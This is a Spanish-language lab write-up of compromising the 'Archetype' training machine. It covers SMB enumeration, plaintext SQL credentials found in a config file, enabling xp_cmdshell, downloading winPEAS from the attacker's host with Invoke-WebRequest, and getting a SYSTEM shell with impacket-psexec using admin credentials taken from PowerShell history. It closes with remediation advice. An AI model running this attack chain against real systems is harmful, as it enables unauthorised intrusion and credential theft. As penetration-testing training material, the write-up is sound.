---
categories:
  - "[[Ciber]]"
tags:
  - vms
  - pentesting
  - starting-point
  - smb
  - mssql
  - windows
  - impacket
  - privilege-escalation
  - winpeas
created: 2026-04-21
---
## 1. Información General

- **Máquina:** [[Archetype]]
- **IP:** 10.129.88.166
- **SO:** Windows Server (Windows Server 2008 R2 - 2012)
- **Dificultad:** Muy fácil
- **Fecha:** 20/04/2026

## 2. Resumen Ejecutivo

Se comprometió un servidor Windows que exponía servicios SMB y Microsoft SQL Server. Durante la enumeración, se descubrió un recurso compartido SMB accesible sin autenticación (`backups`) que contenía un archivo de configuración SSIS (`.dtsConfig`) con credenciales en texto plano para el servicio SQL. Utilizando `impacket-mssqlclient`, se obtuvo acceso al servidor SQL como `sql_svc` con privilegios de `sysadmin`, lo que permitió habilitar `xp_cmdshell` y ejecutar comandos del sistema operativo. La escalada de privilegios se logró al descubrir credenciales de administrador en el historial de PowerShell (`ConsoleHost_history.txt`), y se obtuvo una shell como `NT AUTHORITY\SYSTEM` mediante `impacket-psexec`.

## 3. Enumeración (Reconocimiento)

### 3.1 Escaneo de Red

**Comando utilizado:** `nmap -sV 10.129.88.166`

```
┌──(julicc㉿diavlo)-[~]
└─$ nmap -sV 10.129.88.166
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-20 09:38 +0200
Nmap scan report for 10.129.88.166
Host is up (0.26s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE      VERSION
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.06 seconds
```

| **Puerto** | **Servicio** | **Versión** | **Estado** |
|---|---|---|---|
| 135 | MSRPC | Microsoft Windows RPC | Abierto |
| 139 | NetBIOS-SSN | Microsoft Windows netbios-ssn | Abierto |
| 445 | Microsoft-DS | Windows Server 2008 R2 - 2012 | Abierto |
| 1433 | MS-SQL | Microsoft SQL Server 2017 14.00.1000 | Abierto |
| 5985 | HTTP (WinRM) | Microsoft HTTPAPI httpd 2.0 | Abierto |

### 3.2 Enumeración SMB

Se listaron los recursos compartidos disponibles mediante `smbclient`:

```
┌──(julicc㉿diavlo)-[~]
└─$ smbclient -L 10.129.88.166
Password for [WORKGROUP\julicc]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backups         Disk
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.88.166 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

El recurso `backups` resultó accesible sin credenciales (null session):

```
┌──(julicc㉿diavlo)-[~]
└─$ smbclient -N '\\10.129.88.166\backups'
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Jan 20 13:20:57 2020
  ..                                  D        0  Mon Jan 20 13:20:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 13:23:02 2020

                5056511 blocks of size 4096. 2529067 blocks available
smb: \> get prod.dtsConfig
getting file \prod.dtsConfig of size 609 as prod.dtsConfig (0.8 KiloBytes/sec) (average 0.8 KiloBytes/sec)
```

### 3.3 Credenciales Descubiertas en Configuración SSIS

El archivo `prod.dtsConfig` contenía credenciales SQL en texto plano:

```xml
┌──(julicc㉿diavlo)-[~]
└─$ cat prod.dtsConfig
<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=[[Archetype|ARCHETYPE]]\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration>
```

- **Credenciales comprometidas:** `[[Archetype|ARCHETYPE]]\sql_svc:M3g4c0rp123`

## 4. Explotación

### 4.1 Acceso al SQL Server

Se utilizó `impacket-mssqlclient` con autenticación Windows para conectarse al servidor SQL. El concepto clave aquí es **Transact SQL shell** con `xp_cmdshell`:

```
┌──(julicc㉿diavlo)-[~]
└─$ impacket-mssqlclient sql_svc:M3g4c0rp123@10.129.88.166 -windows-auth
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO([[Archetype|ARCHETYPE]]): Line 1: Changed database context to 'master'.
[*] INFO([[Archetype|ARCHETYPE]]): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2017 RTM (14.0.1000)
[!] Press help for extra shell commands
```

### 4.2 Habilitación de xp_cmdshell

El primer paso fue verificar el rol en el servidor con `SELECT is_srvrolemember('sysadmin');`. Al intentar ejecutar `xp_cmdshell` directamente, el acceso estaba bloqueado:

```
SQL ([[Archetype|ARCHETYPE]]\sql_svc  dbo@master)> xp_cmdshell
ERROR([[Archetype|ARCHETYPE]]): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.
```

Se verificó la configuración con `sp_configure` y se procedió a habilitar las opciones avanzadas y `xp_cmdshell`:

```sql
SQL ([[Archetype|ARCHETYPE]]\sql_svc  dbo@master)> EXEC sp_configure 'show advanced options', 1;
INFO([[Archetype|ARCHETYPE]]): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL ([[Archetype|ARCHETYPE]]\sql_svc  dbo@master)> RECONFIGURE;
SQL ([[Archetype|ARCHETYPE]]\sql_svc  dbo@master)> EXEC sp_configure 'xp_cmdshell', 1;
INFO([[Archetype|ARCHETYPE]]): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL ([[Archetype|ARCHETYPE]]\sql_svc  dbo@master)> RECONFIGURE;
```

### 4.3 Ejecución Remota de Comandos

```
SQL ([[Archetype|ARCHETYPE]]\sql_svc  dbo@master)> EXEC xp_cmdshell 'whoami';
output
-----------------
[[Archetype|archetype]]\sql_svc
NULL
```

### 4.4 Descarga y Ejecución de winPEAS

Se transfirió `winPEAS.bat` al servidor para enumeración local:

```
SQL ([[Archetype|ARCHETYPE]]\sql_svc  dbo@master)> EXEC xp_cmdshell 'powershell -c "Invoke-WebRequest -Uri http://10.10.16.225:8000/winPEAS.bat -OutFile C:\Users\Public\winPEAS.bat -UseBasicParsing"';
output
------
NULL
SQL ([[Archetype|ARCHETYPE]]\sql_svc  dbo@master)> EXEC xp_cmdshell 'cmd C:\Users\Public\winPEAS.bat';
output
----------------------------------------------------
Microsoft Windows [Version 10.0.17763.2061]
(c) 2018 Microsoft Corporation. All rights reserved.
NULL
```

![[Pasted image 20260420103007.png]]

Ejecutando winPEAS:

![[Pasted image 20260420104648.png]]

## 5. Escalada de Privilegios

### 5.1 Credenciales en el Historial de PowerShell

Del output de winPEAS se observó que tenemos `SeImpersonatePrivilege`, que también es vulnerable al exploit Juicy Potato. Sin embargo, primero se comprobaron los archivos donde podrían existir credenciales. Al ser una cuenta de usuario normal y también una cuenta de servicio, merece la pena comprobar archivos frecuentemente accedidos o comandos ejecutados.

Se leyó el historial de PowerShell, que es el equivalente de `.bash_history` en sistemas Linux. El archivo `ConsoleHost_history.txt` se encuentra en:

`C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\`

```
C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine>type ConsoleHost_history.txt
type ConsoleHost_history.txt
net.exe use T: \\[[Archetype]]\backups /user:administrator MEGACORP_4dm1n!!
exit
```

- **Credenciales comprometidas:** `administrator:MEGACORP_4dm1n!!`

### 5.2 Acceso como SYSTEM via impacket-psexec

Con las credenciales de administrador, se obtuvo una shell como `NT AUTHORITY\SYSTEM`:

```
┌──(julicc㉿diavlo)-[~]
└─$ impacket-psexec administrator@10.129.88.166
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

Password:
[*] Requesting shares on 10.129.88.166.....
[*] Found writable share ADMIN$
[*] Uploading file YrXGIBHB.exe
[*] Opening SVCManager on 10.129.88.166.....
[*] Creating service KYBK on 10.129.88.166.....
[*] Starting service KYBK.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.2061]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

**Compromiso total del sistema alcanzado como `NT AUTHORITY\SYSTEM`.**

## 6. Remediación y Conclusiones

- **Criticidad:** Crítica

**Recomendaciones:**

1. **Eliminar credenciales en archivos de configuración:** Los archivos `.dtsConfig` no deben contener contraseñas en texto plano. Utilizar mecanismos seguros de almacenamiento de secretos como Azure Key Vault o Windows Credential Manager.
2. **Restringir acceso a recursos compartidos SMB:** El recurso `backups` no debería ser accesible sin autenticación (null session). Implementar ACLs restrictivas.
3. **Deshabilitar xp_cmdshell:** Mantener `xp_cmdshell` deshabilitado permanentemente y restringir los privilegios de `sysadmin` a las cuentas estrictamente necesarias.
4. **Limpiar historial de PowerShell:** El historial de comandos puede contener credenciales. Configurar políticas de limpieza automática y nunca introducir contraseñas como argumentos de línea de comandos.
5. **Principio de mínimo privilegio:** La cuenta `sql_svc` no debería tener rol `sysadmin`.
6. **Segregación de credenciales:** No reutilizar contraseñas entre cuentas de servicio y cuentas de administrador.
